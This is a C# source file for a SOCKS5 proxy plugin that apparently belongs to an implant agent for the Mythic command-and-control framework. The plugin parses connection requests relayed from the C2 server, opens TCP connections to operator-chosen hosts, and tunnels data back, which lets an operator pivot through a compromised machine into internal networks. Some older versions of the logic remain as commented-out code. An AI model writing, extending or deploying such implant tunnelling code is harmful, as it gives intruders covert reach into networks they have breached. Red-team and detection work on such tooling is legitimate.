using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
using System.Net.Mail;
using System.Text.Json;
using System.Xml.Schema;

namespace Agent
{
    public class Plugin : IPlugin, IProxyPlugin
    {
        public string Name => "socks";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ConcurrentDictionary<int, Unclassified.Net.AsyncTcpClient> connections { get; set; }
        private ConcurrentDictionary<int, AutoResetEvent> resetEvents = new ConcurrentDictionary<int, AutoResetEvent>();
        //private ConcurrentDictionary<int, ConnectionConfig> connections { get; set; }
        private bool _running = false;

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.logger = logger;
            this.connections = new ConcurrentDictionary<int, Unclassified.Net.AsyncTcpClient>();
        }

        public async Task Execute(ServerJob job)
        {
        }
        public async Task HandleDatagram(ServerDatagram sm)
        {
            if (!connections.ContainsKey(sm.server_id) && sm.exit)
            {
                return;
            }

            if (!connections.ContainsKey(sm.server_id))
            {

                if (!await HandleNewConnection(sm))
                {
                    Console.WriteLine("Returning failure.");
                    await ReturnMessageFailure(sm.server_id);
                }//Add new connection
                //else
                //{
                //    await ReturnSuccess(sm.server_id);
                //}
                return;
            }

            if (!string.IsNullOrEmpty(sm.data))
            {
                await connections[sm.server_id].Send(Misc.Base64DecodeToByteArray(sm.data));
            }
        }
        //public async Task HandleDatagram(ServerDatagram sm)
        //{
        //    if(!connections.ContainsKey(sm.server_id) && sm.exit)
        //    {
        //        return;
        //    }

        //    if (!connections.ContainsKey(sm.server_id))
        //    {

        //        if (!await HandleNewConnection(sm))
        //        {
        //            ReturnMessageFailure(sm.server_id);
        //        }//Add new connection
        //        else
        //        {
        //            ReturnSuccess(sm.server_id);
        //        }
        //        return;
        //    }

        //    if (!string.IsNullOrEmpty(sm.data))
        //    {
        //        await connections[sm.server_id].ForwardDataAsync(Misc.Base64DecodeToByteArray(sm.data));
        //    }
        //}

        /// <summary>
        /// Handle a new connection forwarded from the Mythic server
        /// </summary>
        /// <param name="address">IP address</param>
        /// <param name="sm">Socks Message</param>
        //private async Task<bool> HandleNewConnection(ServerDatagram sm)
        //{
        //    if (string.IsNullOrEmpty(sm.data))
        //    {
        //        return false;
        //    }

        //    ConnectionOptions co = new ConnectionOptions(sm); //Begin to parse the packet
        //    if (!co.Parse())
        //    {
        //        ReturnMessageFailure(co.server_id);
        //        return false;
        //    }
        //    var client = new AsyncTCPClient2(co.ip, co.port, messageManager, co.server_id);
        //    //client.Connected += () => ReturnSuccess(sm.server_id);
        //    //client.MessageReceived += data => Console.WriteLine(data);
        //    client.MessageReceived += data => messageManager.AddResponse(DatagramSource.Socks5, new ServerDatagram(sm.server_id, data, !client.IsConnected));
        //    client.Disconnected += () => messageManager.AddResponse(DatagramSource.Socks5, new ServerDatagram(sm.server_id, new byte[0], true));
        //    return await client.ConnectAsync() && connections.TryAdd(sm.server_id, client);
        //}
        private async Task<bool> HandleNewConnection(ServerDatagram sm)
        {
            if (string.IsNullOrEmpty(sm.data))
            {
                return false;
            }

            ConnectionOptions co = new ConnectionOptions(sm); //Begin to parse the packet
            Console.WriteLine(sm.data);
            if (!co.Parse())
            {
                await ReturnMessageFailure(co.server_id);
                return false;
            }

            var client = new Unclassified.Net.AsyncTcpClient(sm.server_id)
            {
                IPAddress = co.ip,
                Port = co.port,
                AutoReconnect = false,
                ConnectedCallback = async (client, isReconnected) =>
                {
                    if (resetEvents.ContainsKey(client.server_id))
                    {
                        resetEvents[client.server_id].Set();
                    }
                    await ReturnSuccess(client.server_id);
                },
                ReceivedCallback = async (client, count) =>
                {
                    Console.WriteLine(count);
                    byte[] buffer = client.ByteBuffer.Dequeue(count);
                    await messageManager.AddResponse(DatagramSource.Socks5, new ServerDatagram(client.server_id, buffer, false));
                },
                ClosedCallback = async (client, closedByRemote) =>
                {
                    if (resetEvents.ContainsKey(client.server_id))
                    {
                        resetEvents[client.server_id].Set();  
                    }
                    if (!connections.ContainsKey(client.server_id))
                    {
                        await ReturnMessageFailure(client.server_id);
                        return;
                    }
                    await messageManager.AddResponse(DatagramSource.Socks5,new ServerDatagram(client.server_id, Array.Empty<byte>(), true));
                }
            };
            resetEvents.TryAdd(client.server_id, new AutoResetEvent(false));
            client.RunAsync();
            resetEvents[client.server_id].WaitOne();
            resetEvents.Remove(client.server_id, out _);
            return client.IsConnected && connections.TryAdd(client.server_id, client);
        }

        public async Task ReturnMessageFailure(int id)
        {
            await this.messageManager.AddResponse(
                DatagramSource.Socks5,
                new ServerDatagram(
                    id,
                    new ConnectResponse
                    {
                        bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                        bndport = new byte[] { 0x00, 0x00 },
                        addrtype = (byte)AddressType.IPv4,
                        status = ConnectResponseStatus.GeneralFailure,
                    }.ToByte(),
                    true
                ));
        }
        public async Task ReturnSuccess(int id)
        {
            ServerDatagram smOut = new ServerDatagram(
             id,
             new ConnectResponse
             {
                 bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                 bndport = new byte[] { 0x00, 0x00 },
                 addrtype = (byte)AddressType.IPv4,
                 status = ConnectResponseStatus.Success,
             }.ToByte(),
             false
            );
            await messageManager.AddResponse(DatagramSource.Socks5, smOut);
        }

        //public async Task<List<ServerDatagram>> GetServerMessages()
        //{
        //    List<ServerDatagram> messages = new List<ServerDatagram>();
        //    foreach(var connection in connections)
        //    {
        //        var msg = await connection.Value.GetServerDatagram(new CancellationToken());
        //        if (msg != null)
        //        {
        //            messages.Add(msg);
        //        }

        //        if (!connection.Value.IsConnected)
        //        {
        //            connections.Remove(msg.server_id, out _);
        //        }
        //    }
        //    return messages;
        //}
        //public async Task FlushServerMessages()
        //{
        //    List<ServerDatagram> messages = new List<ServerDatagram>();
        //    foreach (var connection in connections.Values)
        //    {
        //        var msg = await connection.GetServerDatagram(new CancellationToken());
        //        if (msg != null)
        //        {
        //            await messageManager.AddResponse(DatagramSource.Socks5, msg);
        //        }
        //        else
        //        {
        //            Console.WriteLine("msg was null");
        //        }

        //        if (!connection.IsConnected)
        //        {
              
        //            connections.Remove(msg.server_id, out _);
        //        }
        //    }
        //    //Console.WriteLine($"Returning {messages.Count()} messages.");
        //    //await messageManager.Add(messages);
        //}
    }
}
